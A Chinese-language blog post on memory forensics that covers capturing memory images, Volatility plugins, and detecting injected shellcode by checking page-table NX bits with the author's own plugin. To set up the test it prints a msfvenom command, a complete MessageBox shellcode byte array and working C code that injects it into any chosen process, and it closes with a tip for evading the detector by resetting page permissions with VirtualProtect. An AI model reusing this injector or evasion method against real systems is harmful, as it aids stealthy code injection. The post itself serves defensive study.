---
layout:     post
title:      内存取证（一）：从内存取证角度检测shellcode
subtitle:   利用内存取证技术检测恶意代码
date:       2021-09-19
author:     Hongtai S
header-img: img/15.jpg
catalog: true
tags:
    - shellcode
    - 二进制
    - 内存取证
    - 进程注入
---
# 前置知识

## 内存取证技术

内存取证技术是计算机取证技术的分支，是指从计算机物理内存和页面交换文件中查找、提取、分析易失性证据，方法是通过硬件接口、软件获取、虚拟机快照等方式获取内存转储文件，将其保存到非易失性存储器中，使用专用软件（如Volatility Framework或Rekall等）进行分析。

### 获取内存镜像

内存镜像获取的方式有很多种，不同情况下应采取不同的方法，具体内存获取方式决策树如下图所示：

![1.PNG](https://i.loli.net/2021/09/19/8vDEhWfLTCz364r.png)

如果目标操作系统是虚拟机，可以使用虚拟机挂起功能将运行的虚拟机挂起。

![2.PNG](https://i.loli.net/2021/09/19/h7BDdOTgfcQHAvb.png)

然后在对应的目录中能够找到一个扩展名为.vmem的文件，这个文件中包含了虚拟机全部的物理内存数据和其他配置信息。

![3.PNG](https://i.loli.net/2021/09/19/wDk7YX5lUpIz9Pa.png)

另外，也可以通过软件的方式获取，这里推荐使用[DumpIt](https://dumpit.soft32.com/)这个软件，在目标系统安装好后双击运行，按y + 回车，等待一会显示dump成功后，就能够在其所在的目录中找到一个扩展名为.raw的文件：

![4.PNG](https://i.loli.net/2021/09/19/M8KH3oterh2TOWz.png)

![5.PNG](https://i.loli.net/2021/09/19/8qd5fHZIsSrhnxR.png)

目前笔者常用的获取内存转储的方式是这两种，其他方式有兴趣可以去了解一下，详细参考《The Art of Memory Forensics》一书。

### 分析内存镜像

目前主流的分析内存镜像的方法是使用Volatility内存取证框架分析。

[Volatility Framework](https://github.com/volatilityfoundation/volatility)是一款基于GNU协议开发的开源内存取证框架，使用python语言编写，支持32位或64位的Windows、Linux、Mac OS、Android的大多数版本操作系统，其最大的亮点在于框架的可扩展性，取证人员可通过框架提供的基础功能接口编写自己的插件，从不同的角度分析内存中的数据，以满足不同的取证需求。

目前volatility常用的插件有：

1. pslist：列出dump时目标系统中全部的进程，并输出其详细信息，包括进程名、进程ID、父进程ID、线程个数、句柄数、会话数、运行时间和结束时间等，运行示例如图：

![6.PNG](https://i.loli.net/2021/09/19/yThB3vIFuSP9d82.png)

2. pstree：显示各个进程之间的父子关系，运行示例如图：

![7.PNG](https://i.loli.net/2021/09/19/zZykNxU3RFdPwsI.png)

3. dlllist：显示进程中全部加载的模块，运行示例如图：

![8.PNG](https://i.loli.net/2021/09/19/56cQJakGFHrBjye.png)

还有许多插件实现了不同的功能，这里不一一运行了，这里给出volatility中的全部插件列表及其功能：

```
		amcache        	Print AmCache information
		apihooks       	Detect API hooks in process and kernel memory
		atoms          	Print session and window station atom tables
		atomscan       	Pool scanner for atom tables
		auditpol       	Prints out the Audit Policies from HKLM\SECURITY\Policy\PolAdtEv
		bigpools       	Dump the big page pools using BigPagePoolScanner
		bioskbd        	Reads the keyboard buffer from Real Mode memory
		cachedump      	Dumps cached domain hashes from memory
		callbacks      	Print system-wide notification routines
		clipboard      	Extract the contents of the windows clipboard
		cmdline        	Display process command-line arguments
		cmdscan        	Extract command history by scanning for _COMMAND_HISTORY
		consoles       	Extract command history by scanning for _CONSOLE_INFORMATION
		crashinfo      	Dump crash-dump information
		deskscan       	Poolscaner for tagDESKTOP (desktops)
		devicetree     	Show device tree
		dlldump        	Dump DLLs from a process address space
		dlllist        	Print list of loaded dlls for each process
		driverirp      	Driver IRP hook detection
		drivermodule   	Associate driver objects to kernel modules
		driverscan     	Pool scanner for driver objects
		dumpcerts      	Dump RSA private and public SSL keys
		dumpfiles      	Extract memory mapped and cached files
		dumpregistry   	Dumps registry files out to disk 
		editbox        	Displays information about Edit controls. (Listbox experimental.)
		envars         	Display process environment variables
		eventhooks     	Print details on windows event hooks
		filescan       	Pool scanner for file objects
		gahti          	Dump the USER handle type information
		getservicesids 	Get the names of services in the Registry and return Calculated SID
		getsids        	Print the SIDs owning each process
		handles        	Print list of open handles for each process
		hashdump       	Dumps passwords hashes (LM/NTLM) from memory
		hibinfo        	Dump hibernation file information
		hivedump       	Prints out a hive
		hivelist       	Print list of registry hives.
		hivescan       	Pool scanner for registry hives
		hpakextract    	Extract physical memory from an HPAK file
		hpakinfo       	Info on an HPAK file
		iehistory      	Reconstruct Internet Explorer cache / history
		imagecopy      	Copies a physical address space out as a raw DD image
		imageinfo      	Identify information for the image 
		impscan        	Scan for calls to imported functions
		joblinks       	Print process job link information
		kdbgscan       	Search for and dump potential KDBG values
		kpcrscan       	Search for and dump potential KPCR values
		ldrmodules     	Detect unlinked DLLs
		lsadump        	Dump (decrypted) LSA secrets from the registry
		machoinfo      	Dump Mach-O file format information
		malfind        	Find hidden and injected code
		malfindplus    	Find the injected code
		mbrparser      	Scans for and parses potential Master Boot Records (MBRs) 
		memdump        	Dump the addressable memory for a process
		memmap         	Print the memory map
		messagehooks   	List desktop and thread window message hooks
		mftparser      	Scans for and parses potential MFT entries 
		moddump        	Dump a kernel driver to an executable file sample
		modscan        	Pool scanner for kernel modules
		modules        	Print list of loaded modules
		multiscan      	Scan for various objects at once
		mutantscan     	Pool scanner for mutex objects
		netscan        	Scan a Vista (or later) image for connections and sockets
		objtypescan    	Scan for Windows object type objects
		patcher        	Patches memory based on page scans
		poolpeek       	Configurable pool scanner plugin
		pooltracker    	Show a summary of pool tag usage
		printkey       	Print a registry key, and its subkeys and values
		privs          	Display process privileges
		procdump       	Dump a process to an executable file sample
		pslist         	Print all running processes by following the EPROCESS lists 
		psscan         	Pool scanner for process objects
		pstree         	Print process list as a tree
		psxview        	Find hidden processes with various process listings
		qemuinfo       	Dump Qemu information
		raw2dmp        	Converts a physical memory sample to a windbg crash dump
		screenshot     	Save a pseudo-screenshot based on GDI windows
		sessions       	List details on _MM_SESSION_SPACE (user logon sessions)
		shellbags      	Prints ShellBags info
		shimcache      	Parses the Application Compatibility Shim Cache registry key
		shutdowntime   	Print ShutdownTime of machine from registry
		ssdt           	Display SSDT entries
		strings        	Match physical offsets to virtual addresses (may take a while, VERY verbose)
		svcscan        	Scan for Windows services
		symlinkscan    	Pool scanner for symlink objects
		thrdscan       	Pool scanner for thread objects
		threads        	Investigate _ETHREAD and _KTHREADs
		timeliner      	Creates a timeline from various artifacts in memory 
		timers         	Print kernel timers and associated module DPCs
		truecryptmaster	Recover TrueCrypt 7.1a Master Keys
		truecryptpassphrase	TrueCrypt Cached Passphrase Finder
		truecryptsummary	TrueCrypt Summary
		unloadedmodules	Print list of unloaded modules
		userassist     	Print userassist registry keys and information
		userhandles    	Dump the USER handle tables
		vaddump        	Dumps out the vad sections to a file
		vadinfo        	Dump the VAD info
		vadtree        	Walk the VAD tree and display in tree format
		vadwalk        	Walk the VAD tree
		vboxinfo       	Dump virtualbox information
		verinfo        	Prints out the version information from PE images
		vmwareinfo     	Dump VMware VMSS/VMSN information
		volshell       	Shell in the memory image
		win10cookie    	Find the ObHeaderCookie value for Windows 10
		windows        	Print Desktop Windows (verbose details)
		wintree        	Print Z-Order Desktop Windows Tree
		wndscan        	Pool scanner for window stations
		yarascan       	Scan process or kernel memory with Yara signatures
```

## shellcode注入

shellcode注入是一种进程注入技术，其主要过程如下：

1. 利用OpenProcess()附加到被害进程

2. 使用VirtualAllocEx()在被害进程中分配内存，这里一定要以可执行权限分配，不然会由于DEP保护，使得注入的代码无法执行

3. 使用WriteProcessMemory()函数在分配的内存中写入shellcode

4. 使用CreateRemoteThread()将程序执行流控制到shellcode的起始地址（执行shellcode）

# shellcode注入检测思路

shellcode成功注入并执行后，受害进程中会存在具有可执行权限保护的页面，那么页面对应的pte的NX位应置为0。而正常进程中几乎不可能利用分配的内存去执行恶意代码，也就是说一般情况下分配的内存不会出现可执行权限，利用这一特点，能够检测进程地址空间是否有shellcode。

检测思路如下：

1. 首先将进程的用户地址空间区分为映射文件区和非映射文件区，映射文件区主要包括进程的加载可执行文件和模块，如exe文件、dll文件、nls文件等；非映射文件区主要包括内存中的堆栈等缓冲区，这些内存区几乎不会分配可执行权限的页面。这样做的目的是由于内存中的映射文件本身具有可执行的页面，需要将这些排除在外，防止产生误报。

2. 获取全部非映射文件区的页面的pte

3. 检查这些pte的NX位

4. 若存在NX为0的页面，说明这个页面可能是被注入的页面

5. 输出被注入的页面地址及其内容

# 实现shellcode注入

使用kali生成shellcode：
```
msfvenom -a x64 --platform Windows \
-p windows/x64/messagebox \
-b '\x00\x0b' TEXT='Shellcode has been executed!' TITLE='Hack by sht' -f c > shellcode.c
```
此处生成的是一个弹出对话框的shellcode。

```c
unsigned char buf[] = 
"\x48\x31\xc9\x48\x81\xe9\xd9\xff\xff\xff\x48\x8d\x05\xef\xff"
"\xff\xff\x48\xbb\xa6\xbc\xa1\x22\x73\x10\x99\x2f\x48\x31\x58"
"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x5a\xf4\x20\xc6\x83\xef"
"\x66\xd0\x4e\x6c\xa1\x22\x73\x51\xc8\x6e\xf6\xee\xf0\x74\x3b"
"\x21\x4b\x4a\xee\x37\xf3\x42\x4d\x58\x12\x7d\xbe\x82\xe9\xa9"
"\x21\x30\xa7\x67\x2d\xce\xf1\x1c\x3b\x1f\x2e\x65\xec\xf1\x90"
"\xeb\x3b\x21\x59\x83\x9a\xdd\xdd\x20\x5f\x30\xd8\xee\x6f\xb1"
"\xe0\x23\xb2\xf2\x74\x7d\xe7\xed\x9f\x6a\xf8\x42\xb9\x11\x2d"
"\xfe\x9d\x6a\x72\xc0\xa7\xa4\x26\x34\xa1\x22\x73\x58\x1c\xef"
"\xd2\xd3\xe9\x23\xa3\x40\xa7\xa4\xee\xa4\x9f\x66\xf8\x50\xb9"
"\x66\xa7\x6c\x42\x7e\x3b\xef\x50\x11\xe7\x37\x95\xaa\x3b\x11"
"\x4f\x62\x97\x75\xe9\x13\xb3\xbc\xd8\xee\x6f\xb1\xe0\x23\xb2"
"\x28\x79\x5a\x57\x82\xed\x21\x3f\x34\x91\x6a\x9f\x6d\xd4\xf4"
"\x2b\x2e\xdd\xa4\xe6\x98\xe8\x23\xa3\x76\xa7\x6e\x2d\xb0\xe9"
"\x1c\x37\x9b\xd9\x33\xef\xbd\x71\x1c\x32\x9b\x9d\xa7\xee\xbd"
"\x71\x63\x2b\x51\xc1\x71\xff\xe6\xe0\x7a\x32\x49\xd8\x75\xee"
"\x3f\x4d\x02\x32\x42\x66\xcf\xfe\xfd\xf8\x78\x4d\x58\x12\x3d"
"\x4f\xf5\x5e\xdd\x8c\x4d\xd0\xe8\x67\xbc\xa1\x22\x73\x2e\xd1"
"\xa2\x33\x42\xa1\x22\x73\x2e\xd5\xa2\x23\xa7\xa0\x22\x73\x58"
"\xa8\xe6\xe7\x06\xe4\xa1\x25\x17\x66\xfa\xee\x8d\x68\x63\xc9"
"\xe0\x2c\x8d\xf0\x43\x74\x71\x1b\x75\xf5\x43\xc5\xd3\xc5\x47"
"\x53\x78\xf8\x5c\x86\xde\xc4\x47\x1d\x30\xfc\x57\xc3\xdf\xd4"
"\x56\x16\x74\xb8\x2f\xee\xdd\xc2\x49\x53\x72\xe0\x0f\xd5\xd4"
"\xd5\x22\x73\x10\x99\x2f";
```

编译运行这段代码：

```c
#include <stdio.h>
#include <windows.h>

unsigned char ShellCode[] =
"\x48\x31\xc9\x48\x81\xe9\xd9\xff\xff\xff\x48\x8d\x05\xef\xff"
"\xff\xff\x48\xbb\xa6\xbc\xa1\x22\x73\x10\x99\x2f\x48\x31\x58"
"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x5a\xf4\x20\xc6\x83\xef"
"\x66\xd0\x4e\x6c\xa1\x22\x73\x51\xc8\x6e\xf6\xee\xf0\x74\x3b"
"\x21\x4b\x4a\xee\x37\xf3\x42\x4d\x58\x12\x7d\xbe\x82\xe9\xa9"
"\x21\x30\xa7\x67\x2d\xce\xf1\x1c\x3b\x1f\x2e\x65\xec\xf1\x90"
"\xeb\x3b\x21\x59\x83\x9a\xdd\xdd\x20\x5f\x30\xd8\xee\x6f\xb1"
"\xe0\x23\xb2\xf2\x74\x7d\xe7\xed\x9f\x6a\xf8\x42\xb9\x11\x2d"
"\xfe\x9d\x6a\x72\xc0\xa7\xa4\x26\x34\xa1\x22\x73\x58\x1c\xef"
"\xd2\xd3\xe9\x23\xa3\x40\xa7\xa4\xee\xa4\x9f\x66\xf8\x50\xb9"
"\x66\xa7\x6c\x42\x7e\x3b\xef\x50\x11\xe7\x37\x95\xaa\x3b\x11"
"\x4f\x62\x97\x75\xe9\x13\xb3\xbc\xd8\xee\x6f\xb1\xe0\x23\xb2"
"\x28\x79\x5a\x57\x82\xed\x21\x3f\x34\x91\x6a\x9f\x6d\xd4\xf4"
"\x2b\x2e\xdd\xa4\xe6\x98\xe8\x23\xa3\x76\xa7\x6e\x2d\xb0\xe9"
"\x1c\x37\x9b\xd9\x33\xef\xbd\x71\x1c\x32\x9b\x9d\xa7\xee\xbd"
"\x71\x63\x2b\x51\xc1\x71\xff\xe6\xe0\x7a\x32\x49\xd8\x75\xee"
"\x3f\x4d\x02\x32\x42\x66\xcf\xfe\xfd\xf8\x78\x4d\x58\x12\x3d"
"\x4f\xf5\x5e\xdd\x8c\x4d\xd0\xe8\x67\xbc\xa1\x22\x73\x2e\xd1"
"\xa2\x33\x42\xa1\x22\x73\x2e\xd5\xa2\x23\xa7\xa0\x22\x73\x58"
"\xa8\xe6\xe7\x06\xe4\xa1\x25\x17\x66\xfa\xee\x8d\x68\x63\xc9"
"\xe0\x2c\x8d\xf0\x43\x74\x71\x1b\x75\xf5\x43\xc5\xd3\xc5\x47"
"\x53\x78\xf8\x5c\x86\xde\xc4\x47\x1d\x30\xfc\x57\xc3\xdf\xd4"
"\x56\x16\x74\xb8\x2f\xee\xdd\xc2\x49\x53\x72\xe0\x0f\xd5\xd4"
"\xd5\x22\x73\x10\x99\x2f";

int main()
{
	HANDLE Handle;
	HANDLE remoteThread;
	PVOID remoteBuffer;
	DWORD Pid;
	printf("输入待注入进程PID号：");
	scanf("%d", &Pid);
	Handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE,Pid);  //打开进程句柄
	remoteBuffer = VirtualAllocEx(Handle, NULL, sizeof(ShellCode), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE); // 分配具有可执行权限内存
	WriteProcessMemory(Handle, remoteBuffer, ShellCode, sizeof(ShellCode), NULL); //写入shellcode
	remoteThread = CreateRemoteThread(Handle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    // 创建远程线程，执行地址为shellcode的起始地址
	CloseHandle(Handle);
	return 0;
}
```
运行后输入一个想要注入的进程ID，这里选择taskhostw.exe这个进程

![9.PNG](https://i.loli.net/2021/09/19/P5Cu1TxizKh7gkN.png)

输入任务管理器的PID后显示成功注入并执行了shellcode。

![10.PNG](https://i.loli.net/2021/09/19/VojUicTXw1e3WaH.png)

# 利用volatility检测shellcode

首先执行完shellcode后获取内存转储，这里使用DumpIt获取内存转储，然后使用自己编写的volatility插件检测恶意代码。

检测shellcode插件的源码放在了[我的github](https://github.com/Hongtai-S/Malfindplus)中,插件中的关键代码如下：

```python
def get_user_execute_pages(self, user_pages):
    """获取用户地址空间中全部具有可执行权限的页面"""
    user_execute_pages = []
    for pte, addr, size in user_pages:
        if not pte & self.nx_mask:  # 判断PTE的NX位
            user_execute_pages.append([addr, size])
    return user_execute_pages
```
此处函数用于提取全部具有可执行权限的页面

```python
def get_unmapped_file_pages(self,user_execute_pages, unmapped_file_vads):
    """获取非映射文件区的可执行页面"""
    unmapped_file_pages = []
    for vad in unmapped_file_vads:  # 枚举所有非映射文件区的vad
        for addr, size in user_execute_pages:
            if vad.Start <= addr <= vad.End:  # 检查非映射文件区是否有可执行页面
                unmapped_file_pages.append([addr, size])
    return unmapped_file_pages
```
此处函数用于提取非映射文件区的可执行页面

运行后查看结果：

![11.PNG](https://i.loli.net/2021/09/19/tpOcNsB3gxriyEq.png)

能够看到插件共检测出两个可疑页面，地址分别是：0x28f07b90000和0x7fffa2581000

使用volshell查看这地址的内容：

![12.PNG](https://i.loli.net/2021/09/19/ADPFyiKGN6xsoOE.png)

可以看到0x28f07b90000这部分正是shellcode的内容。至此成功检测出被注入shellcode的页面。

# 如何绕过检测（反取证）

思路：由于插件的检测方式依赖于PTE的NX位，在执行完shellcode后可通过VirtualProtect()函数将其可执行权限设置为不可执行，此时插件是无法检测到的。